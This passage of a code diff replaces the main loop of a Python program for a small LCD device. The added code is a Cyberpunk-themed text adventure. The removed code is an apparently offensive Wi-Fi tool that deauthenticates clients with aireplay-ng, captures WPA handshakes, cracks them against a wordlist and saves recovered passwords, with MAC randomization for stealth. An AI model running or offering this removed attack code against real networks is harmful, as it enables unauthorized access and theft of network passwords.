+        "Word spreads. You're no longer a nobody. A Militech agent approaches you."
+    ])
+    choices = ["Talk to Militech agent", "Ignore her", "Take a break at the bar"]
+    idx = g.choose(choices)
+    if idx == 0: return "militech_agent"
+    elif idx == 1: return "afterlife_hub"
+    else: return "bar_break"
+
+def scene_militech_agent(g):
+    g.show_text([
+        "Agent: 'Niko, we saw your work. Militech wants to hire you for a bigger job.",
+        "Infiltrate the old Arasaka tower ruins. Retrieve data on the Relic 2.0 prototype.'"
+    ])
+    choices = ["Accept Militech job", "Refuse", "Ask about payment"]
+    idx = g.choose(choices)
+    if idx == 0:
+        g.set_flag("arasaka_job")
+        g.change_reputation("militech", 2)
+        return "arasaka_tower"
+    elif idx == 1:
+        return "afterlife_hub"
+    else:
+        g.show_text(["Agent: '20k eddies, plus a full cyberware suite.'"])
+        return "militech_agent"
+
+def scene_bar_break(g):
+    g.show_text([
+        "You sit at the bar. A woman with silver hair sits next to you.",
+        "'You're Niko. I heard you're looking for a ghost.'"
+    ])
+    choices = ["Who are you?", "What ghost?", "Ignore her"]
+    idx = g.choose(choices)
+    if idx == 0:
+        return "mysterious_woman"
+    elif idx == 1:
+        return "ghost_talk"
+    else:
+        return "afterlife_hub"
+
+def scene_mysterious_woman(g):
+    g.show_text([
+        "'My name is Maya. No, not your solo. Different Maya.'",
+        "'I know where Lucy is. But you'll need to prove yourself first.'"
+    ])
+    g.set_flag("met_mysterious_maya")
+    return "afterlife_hub"
+
+def scene_ghost_talk(g):
+    g.show_text([
+        "'The ghost netrunner. Lucy. She's real. And she's looking for someone to help her finish what David started.'"
+    ])
+    return "afterlife_hub"
+
+def scene_arasaka_tower(g):
+    g.show_text([
+        "The old Arasaka tower is a crumbling skeleton. Radiation warnings everywhere.",
+        "Your crew suits up. Jin says, 'The subnet is still active. And there's something in there.'"
+    ])
+    choices = ["Enter the tower", "Abort the mission", "Search for another entrance"]
+    idx = g.choose(choices)
+    if idx == 0: return "tower_entrance"
+    elif idx == 1: return "afterlife_hub"
+    else: return "tower_side"
+
+def scene_tower_side(g):
+    g.show_text([
+        "You find a side entrance. It's a maintenance shaft.",
+        "You climb down. It leads directly to the sublevel lab.",
+        "You bypass the main security."
+    ])
+    return "tower_sublevel"
+
+def scene_tower_entrance(g):
+    g.show_text([
+        "The main lobby is dark. Bodies of Arasaka security from decades ago.",
+        "A ghostly projection flickers: 'Warning – unauthorized access. Security systems active.'"
+    ])
+    choices = ["Hack the terminal", "Fight through", "Use the vents"]
+    idx = g.choose(choices)
+    if idx == 0 and "netrunner" in g.crew:
+        return "tower_hack"
+    elif idx == 1 and "solo" in g.crew:
+        return "tower_fight"
+    elif idx == 2:
+        return "tower_vents"
+    else:
+        return "tower_fail"
+
+def scene_tower_hack(g):
+    g.show_text(["Jin cracks the security. 'There's a Black ICE. Hold on...'", "He bypasses it. The door opens."])
+    return "tower_sublevel"
+
+def scene_tower_fight(g):
+    g.show_text(["Maya engages the automated turrets. You take cover. Lina disables them with an EMP."])
+    return "tower_sublevel"
+
+def scene_tower_vents(g):
+    g.show_text(["You crawl through vents. The air is stale. You emerge in a server room."])
+    return "tower_sublevel"
+
+def scene_tower_fail(g):
+    g.show_text(["Alarms blare. The floor collapses. You barely escape with your life."])
+    return "afterlife_hub"
+
+def scene_tower_sublevel(g):
+    g.show_text([
+        "Sublevel -3. The relic research lab. A single terminal glows.",
+        "On it: 'Project Relic 2.0 – engram transfer complete. Status: active.'"
+    ])
+    choices = ["Download data", "Destroy the terminal", "Search for physical drives"]
+    idx = g.choose(choices)
+    if idx == 0:
+        g.add_item("relic_data")
+        return "tower_ending"
+    elif idx == 1:
+        return "tower_destroy"
+    else:
+        return "tower_search"
+
+def scene_tower_destroy(g):
+    g.show_text(["You smash the terminal. The data is lost. Militech is furious."])
+    g.change_reputation("militech", -5)
+    return "after_convoy"
+
+def scene_tower_search(g):
+    g.show_text(["You find a hidden databank. It contains the Relic 2.0 schematics."])
+    g.add_item("relic_schematics")
+    return "tower_ending"
+
+def scene_tower_ending(g):
+    g.show_text([
+        "You escape as the tower begins to collapse. Militech is pleased.",
+        "You are now a legend. But the ghost netrunner finally contacts you."
+    ])
+    return "lucy_contact"
+
+def scene_lucy_contact(g):
+    g.show_text([
+        "A secure message appears on your agent: 'Niko. Meet me at the old netrunner den in Pacifica.",
+        "Come alone. – L'"
+    ])
+    choices = ["Go to Pacifica", "Ignore the message", "Bring your crew"]
+    idx = g.choose(choices)
+    if idx == 0: return "pacifica_den"
+    elif idx == 1: return "afterlife_hub"
+    else: return "crew_lucy"
+
+def scene_pacifica_den(g):
+    g.show_text([
+        "You enter the den. Holographic ghosts of netrunners past.",
+        "A figure in a white jacket turns. Silver hair. 'I'm Lucy. You've heard of me.'"
+    ])
+    choices = ["Ask about David", "Offer to help her", "Ask for a job"]
+    idx = g.choose(choices)
+    if idx == 0: return "lucy_david"
+    elif idx == 1: return "lucy_help"
+    else: return "lucy_job"
+
+def scene_lucy_david(g):
+    g.show_text([
+        "Lucy's eyes harden. 'David's dead. But his dream isn't. Arasaka still has engrams.",
+        "'I want to free them. Will you help me?'"
+    ])
+    choices = ["Yes", "No", "Ask about payment"]
+    idx = g.choose(choices)
+    if idx == 0:
+        g.set_flag("lucy_mission")
+        return "lucy_mission"
+    elif idx == 1:
+        return "afterlife_hub"
+    else:
+        g.show_text(["Lucy: 'There's no payment. Only justice.'"])
+        return "lucy_david"
+
+def scene_lucy_help(g):
+    g.show_text([
+        "Lucy: 'Good. We need to infiltrate the last Arasaka subnet. The Mikoshi backup.'"
+    ])
+    g.set_flag("lucy_mission")
+    return "lucy_mission"
+
+def scene_lucy_job(g):
+    g.show_text(["Lucy: 'I don't have jobs. I have a cause. Are you in?'"])
+    choices = ["Yes", "No"]
+    idx = g.choose(choices)
+    if idx == 0:
+        g.set_flag("lucy_mission")
+        return "lucy_mission"
+    else:
+        return "afterlife_hub"
+
+def scene_crew_lucy(g):
+    g.show_text([
+        "You bring your crew. Lucy is annoyed but accepts.",
+        "Maya: 'A ghost? This is insane.' Jin: 'I've heard legends about her.'"
+    ])
+    return "pacifica_den"
+
+def scene_lucy_mission(g):
+    g.show_text([
+        "Lucy explains: 'The Mikoshi backup is in a hidden bunker beneath the Badlands.",
+        "We need to jack in simultaneously. One mistake and we're all fried.'"
+    ])
+    choices = ["Proceed with mission", "Back out", "Ask for more time to prepare"]
+    idx = g.choose(choices)
+    if idx == 0: return "mikoshi_bunker"
+    elif idx == 1: return "afterlife_hub"
+    else: return "lucy_prepare"
+
+def scene_lucy_prepare(g):
+    g.show_text(["You gather better gear. Jin upgrades his deck. Lina builds a portable ICE."])
+    return "mikoshi_bunker"
+
+def scene_mikoshi_bunker(g):
+    g.show_text([
+        "The bunker is heavily guarded. Lucy hacks the turrets. You fight through.",
+        "Inside, a massive server. Lucy: 'This is it. David's engram is in there.'"
+    ])
+    choices = ["Help Lucy extract engrams", "Sabotage the server for Militech", "Destroy everything"]
+    idx = g.choose(choices)
+    if idx == 0:
+        return "ending_legend"
+    elif idx == 1:
+        return "ending_sellout"
+    else:
+        return "ending_purge"
+
+# --------------------- SIDE SCENES ---------------------
+def scene_netrunner_contact(g):
+    g.show_text(["You call the number on the flyer. A gruff voice: 'Meet me at the Red Dirt bar.'"])
+    choices = ["Go to Red Dirt", "Ignore"]
+    idx = g.choose(choices)
+    if idx == 0: return "red_dirt"
+    else: return "afterlife_hub"
+
+def scene_red_dirt(g):
+    g.show_text(["The bar is dim. A netrunner named Sasha waits. 'I need a crew for a bank job.'"])
+    choices = ["Join the bank job", "Refuse"]
+    idx = g.choose(choices)
+    if idx == 0:
+        g.add_item("bank_plan")
+        return "bank_job"
+    else:
+        return "afterlife_hub"
+
+def scene_bank_job(g):
+    g.show_text(["You rob the bank. It goes sideways. You escape with 5k eddies."])
+    g.eddies += 5000
+    return "afterlife_hub"
+
+def scene_club(g):
+    g.show_text(["You go to a club. Neon lights. You dance with a stranger."])
+    choices = ["Go home with them", "Leave alone"]
+    idx = g.choose(choices)
+    if idx == 0: return "romance_one_night"
+    else: return "afterlife_hub"
+
+def scene_romance_one_night(g):
+    g.show_text(["You wake up alone. They stole your cyberdeck."])
+    g.remove_item("cyberdeck")
+    return "afterlife_hub"
+
+def scene_ripperdoc(g):
+    g.show_text(["You visit a ripperdoc. He offers a discount on new chrome."])
+    choices = ["Buy optical camo (1500 eddies)", "Buy subdermal armor (3000)", "Leave"]
+    idx = g.choose(choices)
+    if idx == 0 and g.eddies >= 1500:
+        g.eddies -= 1500
+        g.add_item("optical_camo")
+        g.show_text(["You bought optical camo."])
+    elif idx == 1 and g.eddies >= 3000:
+        g.eddies -= 3000
+        g.add_item("subdermal_armor")
+        g.show_text(["You bought subdermal armor."])
+    else:
+        g.show_text(["Not enough eddies."])
+    return "afterlife_hub"
+
+def scene_cyberpsycho(g):
+    g.show_text(["You encounter a cyberpsycho rampaging. People scream."])
+    choices = ["Fight the psycho", "Run away", "Call MaxTac"]
+    idx = g.choose(choices)
+    if idx == 0 and g.has_item("smart_rifle"):
+        g.show_text(["You subdue the psycho. The media calls you a hero."])
+        g.change_reputation("street", 3)
+        g.health = min(100, g.health + 10)
+        return "afterlife_hub"
+    elif idx == 1:
+        return "afterlife_hub"
+    else:
+        g.show_text(["MaxTac arrives and thanks you. They give you a medal."])
+        g.change_reputation("street", 2)
+        return "afterlife_hub"
+
+def scene_badlands_side(g):
+    g.show_text(["You venture into the badlands. A nomad camp needs help with raiders."])
+    choices = ["Help the nomads", "Ignore"]
+    idx = g.choose(choices)
+    if idx == 0:
+        g.add_item("nomad_friend")
+        return "afterlife_hub"
+    else:
+        return "afterlife_hub"
+
+def scene_pacificia_side(g):
+    g.show_text(["In Pacifica, a street preacher warns of the Voodoo Boys' net."])
+    choices = ["Ignore him", "Ask for a job"]
+    idx = g.choose(choices)
+    if idx == 1:
+        g.set_flag("voodoo_contact")
+        return "voodoo_side"
+    else:
+        return "afterlife_hub"
+
+def scene_voodoo_side(g):
+    g.show_text(["The Voodoo Boys offer you a netrunning gig. Payment: 3k."])
+    choices = ["Accept", "Refuse"]
+    idx = g.choose(choices)
+    if idx == 0:
+        g.eddies += 3000
+        g.change_reputation("voodoo", 2)
+        return "afterlife_hub"
+    else:
+        return "afterlife_hub"
+
+# --------------------- ROMANCE PATHS ---------------------
+def scene_romance_lucy_path(g):
+    if not g.check_flag("lucy_mission"):
+        return "afterlife_hub"
+    g.show_text(["After the mission, Lucy invites you to the net. She holds your hand in digital space."])
+    choices = ["Stay with her", "Return to reality"]
+    idx = g.choose(choices)
+    if idx == 0:
+        g.set_romance("lucy")
+        return "ending_romance_lucy"
+    else:
+        return "ending_legend_solo"
+
+# --------------------- ENDINGS ---------------------
+def ending_legend(g):
+    g.show_text([
+        "You extract the engrams. David's is incomplete, but his dream lives on.",
+        "Lucy thanks you. She vanishes into the net. Your crew becomes legendary.",
+        "You are Niko, the one who freed the ghosts. ENDING: GHOST LEGEND"
+    ])
+    choices = ["Restart", "Exit"]
+    idx = g.choose(choices)
+    if idx == 0: return "start_menu"
+    else: g.running = False; return None
+
+def ending_sellout(g):
+    g.show_text([
+        "You sell the Mikoshi data to Militech. They pay you a fortune.",
+        "But Lucy is captured. Your crew disowns you. You are rich and alone.",
+        "ENDING: CORPO PUPPET"
+    ])
+    choices = ["Restart", "Exit"]
+    idx = g.choose(choices)
+    if idx == 0: return "start_menu"
+    else: g.running = False; return None
+
+def ending_purge(g):
+    g.show_text([
+        "You destroy the server. All engrams are lost. Lucy dies with them.",
+        "Arasaka's past is gone, but so is any chance of redemption.",
+        "You wander the wasteland. ENDING: ASHES"
+    ])
+    choices = ["Restart", "Exit"]
+    idx = g.choose(choices)
+    if idx == 0: return "start_menu"
+    else: g.running = False; return None
+
+def ending_death(g):
+    g.show_text(["You die in a firefight. Your name is forgotten.", "GAME OVER"])
+    choices = ["Restart", "Exit"]
+    idx = g.choose(choices)
+    if idx == 0: return "start_menu"
+    else: g.running = False; return None
+
+def ending_captured(g):
+    g.show_text(["Arasaka captures you. You become an engram.", "GAME OVER"])
+    choices = ["Restart", "Exit"]
+    idx = g.choose(choices)
+    if idx == 0: return "start_menu"
+    else: g.running = False; return None
+
+def ending_romance_jin(g):
+    g.show_text(["You and Jin become partners. He helps you build a netrunning school.", "ENDING: LOVE IN THE NET"])
+    choices = ["Restart", "Exit"]
+    idx = g.choose(choices)
+    if idx == 0: return "start_menu"
+    else: g.running = False; return None
+
+def ending_romance_maya(g):
+    g.show_text(["You and Maya retire to a quiet cabin in the badlands. No more bullets.", "ENDING: PEACE"])
+    choices = ["Restart", "Exit"]
+    idx = g.choose(choices)
+    if idx == 0: return "start_menu"
+    else: g.running = False; return None
+
+def ending_romance_lucy(g):
+    g.show_text(["Lucy pulls you into the net. You become digital lovers, forever roaming.", "ENDING: GHOST LOVE"])
+    choices = ["Restart", "Exit"]
+    idx = g.choose(choices)
+    if idx == 0: return "start_menu"
+    else: g.running = False; return None
+
+def ending_legend_solo(g):
+    g.show_text(["You become the most feared solo in Night City. No crew, no love. Just glory.", "ENDING: LONE LEGEND"])
+    choices = ["Restart", "Exit"]
+    idx = g.choose(choices)
+    if idx == 0: return "start_menu"
+    else: g.running = False; return None
+
+def ending_burnout(g):
+    g.show_text(["You overdose on cyberware. Your body fails. A cautionary tale.", "ENDING: BURNOUT"])
+    choices = ["Restart", "Exit"]
+    idx = g.choose(choices)
+    if idx == 0: return "start_menu"
+    else: g.running = False; return None
+
+# --------------------- SCENE DISPATCHER ---------------------
+scene_map = {
+    "start_menu": scene_start_menu,
+    "start": scene_start,
+    "afterlife_hub": scene_afterlife_hub,
+    "fixer_gigs": scene_fixer_gigs,
+    "data_extraction": scene_data_extraction,
+    "bartender": scene_bartender,
+    "shop": scene_shop,
+    "crew_hub": scene_crew_hub,
+    "talk_maya": scene_talk_maya,
+    "talk_jin": scene_talk_jin,
+    "talk_lina": scene_talk_lina,
+    "street": scene_street,
+    "combat_zone": scene_combat_zone,
+    "maya_recruit": scene_maya_recruit,
+    "combat_zone_loot": scene_combat_zone_loot,
+    "combat_zone_bad": scene_combat_zone_bad,
+    "kabuki": scene_kabuki,
+    "vendor_netrunner": scene_vendor_netrunner,
+    "jin_crew": scene_jin_crew,
+    "kabuki_search": scene_kabuki_search,
+    "kabuki_hotdog": scene_kabuki_hotdog,
+    "militech_prep": scene_militech_prep,
+    "weapon_stash": scene_weapon_stash,
+    "convoy_alone": scene_convoy_alone,
+    "find_techie": scene_find_techie,
+    "lina_crew": scene_lina_crew,
+    "convoy": scene_convoy,
+    "after_convoy": scene_after_convoy,
+    "militech_agent": scene_militech_agent,
+    "bar_break": scene_bar_break,
+    "mysterious_woman": scene_mysterious_woman,
+    "ghost_talk": scene_ghost_talk,
+    "arasaka_tower": scene_arasaka_tower,
+    "tower_side": scene_tower_side,
+    "tower_entrance": scene_tower_entrance,
+    "tower_hack": scene_tower_hack,
+    "tower_fight": scene_tower_fight,
+    "tower_vents": scene_tower_vents,
+    "tower_fail": scene_tower_fail,
+    "tower_sublevel": scene_tower_sublevel,
+    "tower_destroy": scene_tower_destroy,
+    "tower_search": scene_tower_search,
+    "tower_ending": scene_tower_ending,
+    "lucy_contact": scene_lucy_contact,
+    "pacifica_den": scene_pacifica_den,
+    "lucy_david": scene_lucy_david,
+    "lucy_help": scene_lucy_help,
+    "lucy_job": scene_lucy_job,
+    "crew_lucy": scene_crew_lucy,
+    "lucy_mission": scene_lucy_mission,
+    "lucy_prepare": scene_lucy_prepare,
+    "mikoshi_bunker": scene_mikoshi_bunker,
+    "netrunner_contact": scene_netrunner_contact,
+    "red_dirt": scene_red_dirt,
+    "bank_job": scene_bank_job,
+    "club": scene_club,
+    "romance_one_night": scene_romance_one_night,
+    "ripperdoc": scene_ripperdoc,
+    "cyberpsycho": scene_cyberpsycho,
+    "badlands_side": scene_badlands_side,
+    "pacificia_side": scene_pacificia_side,
+    "voodoo_side": scene_voodoo_side,
+    "romance_lucy_path": scene_romance_lucy_path,
+    "ending_legend": ending_legend,
+    "ending_sellout": ending_sellout,
+    "ending_purge": ending_purge,
+    "ending_death": ending_death,
+    "ending_captured": ending_captured,
+    "ending_romance_jin": ending_romance_jin,
+    "ending_romance_maya": ending_romance_maya,
+    "ending_romance_lucy": ending_romance_lucy,
+    "ending_legend_solo": ending_legend_solo,
+    "ending_burnout": ending_burnout,
+}
+
+def run_scene(g, name):
+    if name in scene_map:
+        return scene_map[name](g)
+    else:
+        g.show_text([f"Missing scene: {name}. Returning to Afterlife."])
+        return "afterlife_hub"
 
 # ----------------------------------------------------------------------
 # Main
 # ----------------------------------------------------------------------
 def main():
-    global mon_iface, original_mac, view, scroll, networks, selected_idx
-    global auto_attack, auto_attack_stop, deauth_enabled, stealth_enabled, capture_flash
-
-    if not SCAPY_OK:
-        img = Image.new("RGB", (W, H), "black")
-        d = ImageDraw.Draw(img)
-        d.text((4, 40), "scapy not installed", font=f9, fill="red")
-        d.text((4, 55), "sudo pip install scapy", font=f9, fill="white")
-        LCD.LCD_ShowImage(img, 0, 0)
-        time.sleep(3)
-        return
-
-    load_stats()
-    load_config()
-    iface = select_interface()
-    if not iface:
-        img = Image.new("RGB", (W, H), "black")
-        d = ImageDraw.Draw(img)
-        d.text((4, 40), "No WiFi interface", font=f9, fill="red")
-        d.text((4, 55), "Check adapter", font=f9, fill="white")
-        LCD.LCD_ShowImage(img, 0, 0)
-        time.sleep(3)
-        return
-    original_mac = get_mac(iface)
-
-    # Enable monitor mode
-    img = Image.new("RGB", (W, H), "black")
-    d = ImageDraw.Draw(img)
-    d.text((4, 50), f"Monitor: {iface}...", font=f9, fill="#FFAA00")
-    LCD.LCD_ShowImage(img, 0, 0)
-    mon_iface = monitor_up(iface)
-    if not mon_iface:
-        d.text((4, 60), "FAILED", font=f9, fill="red")
-        LCD.LCD_ShowImage(img, 0, 0)
-        time.sleep(3)
-        return
-
-    # Start background threads
-    threading.Thread(target=sniffer_thread, daemon=True).start()
-    threading.Thread(target=half_hs_checker, daemon=True).start()
-    threading.Thread(target=channel_hopper, daemon=True).start()
-
-    # Initial scan for manual mode
-    scan_networks_quick(10)
-
-    view = "face"
-    scroll = 0
-    state = "main"  # main or target_select
-
-    while not shutdown.is_set():
-        btn = wait_btn(0.2)
-        if state == "main":
-            if view == "face":
-                draw_face()
-            elif view == "stats":
-                draw_stats()
-            elif view == "captures":
-                draw_captures(scroll)
-
-            if btn == "KEY3":
-                break
-            elif btn == "KEY1":
-                if view == "face":
-                    view = "stats"
-                elif view == "stats":
-                    view = "captures"
-                else:
-                    view = "face"
-                scroll = 0
-                time.sleep(0.3)
-            elif btn == "KEY2":
-                auto_attack = not auto_attack
-                if auto_attack:
-                    auto_attack_stop.clear()
-                    threading.Thread(target=auto_attack_worker, daemon=True).start()
-                else:
-                    auto_attack_stop.set()
-                time.sleep(0.3)
-            elif btn == "LEFT" and view == "face":
-                deauth_enabled = not deauth_enabled
-                save_config()
-                time.sleep(0.3)
-            elif btn == "RIGHT" and view == "face":
-                stealth_enabled = not stealth_enabled
-                if stealth_enabled and mon_iface:
-                    randomize_mac(mon_iface)
-                    reduce_tx_power(mon_iface)
-                elif not stealth_enabled and mon_iface:
-                    restore_mac(mon_iface, original_mac)
-                    restore_tx_power(mon_iface)
-                time.sleep(0.3)
-            elif btn == "UP" and view == "captures":
-                scroll = max(0, scroll-1)
-            elif btn == "DOWN" and view == "captures":
-                scroll += 1
-            elif btn == "OK":
-                if not capture_event.is_set():
-                    # Start capture
-                    capture_event.set()
-                    set_mood("normal")
-                else:
-                    # In manual mode, show target list
-                    if not auto_attack:
-                        state = "target_select"
-                        scan_networks_quick(10)
-                        selected_idx = 0
-                        draw_target_list()
-        elif state == "target_select":
-            draw_target_list()
-            if btn == "KEY3":
-                state = "main"
-            elif btn == "UP" and networks:
-                selected_idx = (selected_idx - 1) % len(networks)
-                draw_target_list()
-            elif btn == "DOWN" and networks:
-                selected_idx = (selected_idx + 1) % len(networks)
-                draw_target_list()
-            elif btn == "OK" and networks:
-                target = networks[selected_idx]
-                # Single attack
-                set_mood("assoc")
-                ch = int(target["channel"])
-                bssid = target["bssid"]
-                essid = target["essid"]
-                # Get clients
-                tmp = f"/tmp/ktoxgotchi_clients_{bssid.replace(':', '_')}"
-                subprocess.run(f"rm -f {tmp}*", shell=True)
-                subprocess.run(
-                    f"timeout 6 airodump-ng -c {ch} --bssid {bssid} -w {tmp} {mon_iface}",
-                    shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
-                )
-                time.sleep(1)
-                clients = []
-                csv_file = f"{tmp}-01.csv"
-                if os.path.exists(csv_file):
-                    with open(csv_file, errors="ignore") as f:
-                        content = f.read()
-                    if "Station MAC" in content:
-                        station_section = content.split("Station MAC")[1]
-                        for line in station_section.strip().split("\n"):
-                            parts = [p.strip() for p in line.split(",")]
-                            if parts and re.match(r"([0-9A-Fa-f]{2}:){5}", parts[0]):
-                                clients.append(parts[0])
-                if clients:
-                    client = random.choice(clients)
-                    tmp_hs = f"/tmp/ktoxgotchi_manual_{bssid.replace(':', '_')}"
-                    subprocess.run(f"rm -f {tmp_hs}*", shell=True)
-                    proc = subprocess.Popen(
-                        f"airodump-ng -c {ch} --bssid {bssid} -w {tmp_hs} {mon_iface}",
-                        shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
-                    )
-                    time.sleep(2)
-                    subprocess.run(f"aireplay-ng --deauth 10 -a {bssid} -c {client} {mon_iface}",
-                                   shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-                    time.sleep(3)
-                    proc.terminate()
-                    time.sleep(1)
-                    cap_file = f"{tmp_hs}-01.cap"
-                    if os.path.exists(cap_file):
-                        aircrack_out = subprocess.run(f"aircrack-ng {cap_file} 2>/dev/null", shell=True, capture_output=True, text=True).stdout
-                        if "handshake" in aircrack_out.lower():
-                            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
-                            safe_essid = "".join(c for c in essid if c.isalnum() or c in "._-")[:30] or "unknown"
-                            dest = os.path.join(HANDSHAKE_DIR, f"{safe_essid}_{bssid}_{ts}.cap")
-                            subprocess.run(f"cp {cap_file} {dest}", shell=True)
-                            with open(os.path.join(LOOT_DIR, "handshake_log.txt"), "a") as log:
-                                log.write(f"{ts} | {essid} | {bssid} | {dest}\n")
-                            session_handshakes += 1
-                            lifetime_handshakes += 1
-                            save_stats()
-                            set_mood("happy")
-                            if os.path.exists(WORDLIST):
-                                crack_result = subprocess.run(f"aircrack-ng -w {WORDLIST} {dest} 2>/dev/null", shell=True, capture_output=True, text=True).stdout
-                                key_match = re.search(r"KEY FOUND!\s*\[\s*(.+?)\s*\]", crack_result)
-                                if key_match:
-                                    password = key_match.group(1)
-                                    cracked_file = os.path.join(CRACKED_DIR, f"{safe_essid}_{bssid}_{ts}.txt")
-                                    with open(cracked_file, "w") as cf:
-                                        cf.write(f"ESSID: {essid}\nBSSID: {bssid}\nPASSWORD: {password}\nDate: {datetime.now().isoformat()}\n")
-                                    cracked_count += 1
-                                    save_stats()
-                                    set_mood("excited")
-                state = "main"
-                time.sleep(2)
-        time.sleep(0.05)
-
-    # Cleanup
-    shutdown.set()
-    capture_event.clear()
-    auto_attack_stop.set()
-    save_stats()
-    save_config()
-    if stealth_enabled and mon_iface:
-        restore_mac(mon_iface, original_mac)
-        restore_tx_power(mon_iface)
-    time.sleep(0.5)
-    monitor_down(mon_iface)
-    LCD.LCD_Clear()
+    game = Game()
+    game.running = True
+    while game.running:
+        btn = wait_btn(0.01)
+        if btn == "KEY1":
+            game.open_inventory()
+            continue
+        elif btn == "KEY2":
+            game.scene = "afterlife_hub"
+            continue
+        next_scene = run_scene(game, game.scene)
+        if next_scene is None:
+            break
+        game.scene = next_scene
     GPIO.cleanup()
+    LCD.LCD_Clear()
 
 if __name__ == "__main__":
     main()
